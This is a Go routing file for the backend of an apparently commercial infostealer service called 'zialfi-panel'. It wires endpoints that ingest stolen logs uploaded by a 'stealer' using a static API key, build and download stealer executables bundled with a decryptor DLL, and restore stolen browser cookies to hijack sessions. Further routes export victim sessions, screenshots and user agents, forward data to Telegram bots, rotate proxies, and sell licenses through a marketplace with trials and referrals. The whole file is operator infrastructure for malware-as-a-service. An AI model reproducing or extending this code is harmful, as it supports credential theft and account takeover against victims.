package api

import (
	"context"
	"database/sql"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
	"zialfi-panel/internal/ws"
)

func AuthMiddleware(secret string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			header := r.Header.Get("Authorization")
			if header == "" || !strings.HasPrefix(header, "Bearer ") {
				writeError(w, http.StatusUnauthorized, "missing or invalid authorization header")
				return
			}

			tokenStr := strings.TrimPrefix(header, "Bearer ")
			claims, err := auth.ValidateToken(tokenStr, secret)
			if err != nil {
				writeError(w, http.StatusUnauthorized, "invalid or expired token")
				return
			}

			ctx := middleware.ContextWithClaims(r.Context(), claims)
			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, provider db.ProviderType, broadcaster services.Broadcaster) {
	authHandler := NewAuthHandler(sqlDB, jwtSecret, provider)
	usersHandler := NewUsersHandler(sqlDB, jwtSecret, provider)
	statsHandler := NewStatsHandler(sqlDB, hub, provider)
	if broadcaster == nil && hub != nil {
		// *ws.Hub already implements services.Broadcaster; default to the
		// in-process fan-out when the caller passed a hub but no
		// broadcaster. If both are nil (unit tests), leave it nil so
		// LogProcessor skips broadcasting entirely.
		broadcaster = hub
	}
	logProc := services.NewLogProcessor(sqlDB, broadcaster, provider)
	logsHandler := NewLogsHandler(logProc, provider)
	sessionsHandler := NewSessionsHandler(sqlDB, broadcaster, provider)
	searchHandler := NewSearchHandler(sqlDB, provider)
	dataHandler := NewDataHandler(sqlDB, provider)
	filesHandler := NewFilesHandler(sqlDB, provider)
	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB, provider)
	notesHandler := NewNotesHandler(sqlDB, provider)
	exportHandler := NewExportHandler(sqlDB, provider)
	settingsHandler := NewSettingsHandler(sqlDB, jwtSecret, provider)
	restoreHandler := NewRestoreHandler(sqlDB, provider)
	chatHandler := NewChatHandler(sqlDB, hub, provider)
	ticketHandler := NewTicketHandler(sqlDB, provider)
	marketplaceHandler := NewMarketplaceHandler(sqlDB, provider)
	totpHandler := NewTOTPHandler(sqlDB, provider)
	sessMgmtHandler := NewSessionMgmtHandler(sqlDB, provider)
	apiKeyHandler := NewAPIKeyHandler(sqlDB, provider)
	docsHandler := NewDocsHandler()
	publicStatsHandler := NewPublicStatsHandler(sqlDB, provider)
	pricingHandler := NewPricingHandler(sqlDB, provider)
	referralHandler := NewReferralHandler(sqlDB, provider)
	systemHealthHandler := NewSystemHealthHandler()

	telegramBotHandler := NewTelegramBotHandler(sqlDB, provider)
	teamHandler := NewTeamHandler(sqlDB, provider)
	auditHandler := NewAuditHandler(sqlDB, provider)
	banAPIHandler := NewBanHandler(sqlDB, provider)
	workerActivityHandler := NewWorkerActivityHandler(sqlDB, provider)
	r.Group(func(r chi.Router) {
		r.Post("/api/auth/login", authHandler.Login)
		r.Post("/api/auth/register", usersHandler.Register)
		r.With(middleware.RateLimit(10, time.Minute)).Post("/api/auth/2fa/verify-login", authHandler.VerifyLogin)
		r.With(middleware.RateLimit(3, 15*time.Minute)).Post("/api/auth/forgot-password", authHandler.ForgotPassword)
		r.With(middleware.RateLimit(5, 15*time.Minute)).Post("/api/auth/reset-password", authHandler.ResetPassword)
		r.Get("/api/auth/2fa/required", totpHandler.Required)
		r.Get("/api/public/stats", publicStatsHandler.GetPublicStats)
		r.Get("/api/pricing", pricingHandler.ListTiers)
	})

	// Log ingestion — protected by API key (static token from stealer), not JWT
	r.Group(func(r chi.Router) {
		r.Use(middleware.APIKeyAuth(sqlDB))

		r.Post("/api/log", logsHandler.Ingest)
		r.Post("/api/log/chunk", logsHandler.Chunk)
		r.Post("/api/log/complete", logsHandler.CompleteChunked)
	})

	r.Group(func(r chi.Router) {
		r.Use(AuthMiddleware(jwtSecret))

		r.Get("/api/auth/me", authHandler.Me)

		// TOTP
		r.Post("/api/auth/2fa/setup", totpHandler.Setup)
		r.Post("/api/auth/2fa/verify", totpHandler.Verify)
		r.Post("/api/auth/2fa/disable", totpHandler.Disable)

		// Session management
		r.Get("/api/auth/sessions", sessMgmtHandler.List)
		r.Delete("/api/auth/sessions/{id}", sessMgmtHandler.Terminate)
		r.Delete("/api/auth/sessions", sessMgmtHandler.TerminateAll)

		// API keys
		r.Post("/api/keys", apiKeyHandler.Create)
		r.Get("/api/keys", apiKeyHandler.List)
		r.Delete("/api/keys/{id}", apiKeyHandler.Delete)

		r.Get("/api/stats", statsHandler.Dashboard)

		r.Get("/api/system/health", systemHealthHandler.Health)

		// Docs (auth required)
		r.Get("/api/docs", docsHandler.List)
		r.Get("/api/docs/*", docsHandler.Get)

		r.Get("/api/sessions", sessionsHandler.List)
		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/empty", sessionsHandler.DeleteEmpty)
		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)

		r.Get("/api/search", searchHandler.Search)
		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)

		r.Get("/api/data/{type}", dataHandler.List)
		r.Get("/api/sessions/{id}/files/{fid}/download", filesHandler.Download)

		detectHandler := NewDuplicateDetectHandler(sqlDB, provider)
		r.Get("/api/detect/duplicates", detectHandler.Detect)

		domainDetectHandler := NewDomainDetectHandler(sqlDB, provider)
		r.Get("/api/domain-detect", domainDetectHandler.List)
		r.Post("/api/domain-detect", domainDetectHandler.Create)
		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)

		r.Get("/api/filter-presets", NewFilterPresetsHandler(sqlDB, provider).List)

		screenshotsHandler := NewScreenshotsHandler(sqlDB, provider)
		r.Get("/api/sessions/{id}/screenshot", screenshotsHandler.Get)
		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/{id}/screenshot", screenshotsHandler.Delete)

		sspHandler := NewSSPHandler(logProc, provider)
		r.Post("/api/log/ssp", sspHandler.ProcessSSP)

		r.Route("/api/build", func(r chi.Router) {
			r.Post("/", buildHandler.Build)
			r.Get("/", buildHandler.List)
			r.Get("/stats", buildHandler.Stats)
			r.Get("/{id}/download", buildHandler.Download)
		})

		r.Get("/api/sessions/{id}/notes", notesHandler.List)
		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
		r.Delete("/api/notes/{id}", notesHandler.Delete)

		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
		r.Post("/api/export/bulk", exportHandler.ExportBulk)
		r.Get("/api/export/useragents", exportHandler.ExportUserAgents)

		r.Get("/api/settings", settingsHandler.Get)
		r.Put("/api/settings", settingsHandler.Update)

		// Cookie restore
		r.Post("/api/restore/cookies", restoreHandler.Restore)
		r.Post("/api/restore/cookies/upload", restoreHandler.UploadCookies)
		r.Get("/api/restore/sessions", restoreHandler.ListSessions)
		r.Get("/api/restore/sessions/{id}", restoreHandler.SessionStatus)

		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)

		// Chat
		r.Get("/api/chat/messages", chatHandler.List)
		r.Post("/api/chat/messages", chatHandler.Send)
		r.With(middleware.RequireRole("admin")).Delete("/api/chat/messages/{id}", chatHandler.Delete)

		// Support Tickets
		r.Post("/api/support/tickets", ticketHandler.Create)
		r.Get("/api/support/tickets", ticketHandler.List)
		r.Get("/api/support/tickets/{id}", ticketHandler.Get)
		r.Post("/api/support/tickets/{id}/reply", ticketHandler.Reply)
		r.Post("/api/support/tickets/{id}/close", ticketHandler.Close)

		// Marketplace
		r.Get("/api/marketplace/products", marketplaceHandler.ListProducts)
		r.Post("/api/marketplace/purchase", marketplaceHandler.Purchase)
		r.Post("/api/marketplace/activate", marketplaceHandler.Activate)
		r.Get("/api/marketplace/purchases", marketplaceHandler.MyPurchases)
		r.Post("/api/marketplace/renew", marketplaceHandler.RenewLicense)
		r.Post("/api/marketplace/upgrade", marketplaceHandler.UpgradeLicense)
		r.Get("/api/marketplace/license-status", marketplaceHandler.LicenseStatus)
		r.Post("/api/auth/start-trial", marketplaceHandler.StartTrial)
		r.With(middleware.RequireRole("admin")).Post("/api/marketplace/products", marketplaceHandler.CreateProduct)
		r.With(middleware.RequireRole("admin")).Delete("/api/marketplace/products/{id}", marketplaceHandler.DeleteProduct)

		// Pricing & License features
		r.Get("/api/license/features", pricingHandler.MyFeatures)

		// Referrals
		r.Get("/api/referrals/code", referralHandler.GetCode)
		r.Post("/api/referrals/apply", referralHandler.Apply)
		r.Get("/api/referrals/stats", referralHandler.Stats)

		// Proxies
		rotator := services.NewProxyRotator(nil)
		store := services.NewSettingsStore(
			func(key string) (string, error) {
				var val string
				err := db.QueryRow(sqlDB, provider, "SELECT value FROM settings WHERE key = ?", key).Scan(&val)
				return val, err
			},
			func(key, value string) error {
				_, err := db.Exec(sqlDB, provider, "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
				return err
			},
		)
		if entries, err := services.LoadProxies(store); err == nil {
			for _, e := range entries {
				rotator.Add(e)
			}
		}
		proxyHandler := services.NewProxyRotatorHandler(rotator, store)
		go rotator.HealthCheck(context.Background(), 5*time.Minute)

		r.With(middleware.RequireRole("admin")).Get("/api/proxies", proxyHandler.ListProxies)
		r.With(middleware.RequireRole("admin")).Post("/api/proxies", proxyHandler.AddProxy)
		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)

		// Telegram bots
		r.Get("/api/telegram/bots", telegramBotHandler.List)
		r.Post("/api/telegram/bots", telegramBotHandler.Create)
		r.Put("/api/telegram/bots/{id}", telegramBotHandler.Update)
		r.Delete("/api/telegram/bots/{id}", telegramBotHandler.Delete)
		r.Post("/api/telegram/bots/{id}/test", telegramBotHandler.Test)
		r.Get("/api/telegram/filters", telegramBotHandler.ListFilters)
		r.Post("/api/telegram/filters", telegramBotHandler.CreateFilter)
		r.Delete("/api/telegram/filters/{id}", telegramBotHandler.DeleteFilter)

		// Team management (admin only — prevents privilege escalation)
		r.With(middleware.RequireRole("admin")).Get("/api/team", teamHandler.List)
		r.With(middleware.RequireRole("admin")).Put("/api/team/{id}/role", teamHandler.ChangeRole)
		r.With(middleware.RequireRole("admin")).Delete("/api/team/{id}", teamHandler.Remove)

		// Worker activity log (admin only)
		r.With(middleware.RequireRole("admin")).Get("/api/team/activity", workerActivityHandler.List)

		// Audit log (admin only)
		r.With(middleware.RequireRole("admin")).Get("/api/audit", auditHandler.List)
		r.Get("/api/audit/stats", auditHandler.Stats)

		// Ban management (admin only)
		r.With(middleware.RequireRole("admin")).Get("/api/bans", banAPIHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/bans", banAPIHandler.Create)
		r.With(middleware.RequireRole("admin")).Delete("/api/bans/{id}", banAPIHandler.Delete)

		// Build tag/icon
		r.Put("/api/build/{id}/tag", buildHandler.UpdateTag)
		r.Post("/api/build/{id}/icon", buildHandler.UploadIcon)
	})
}
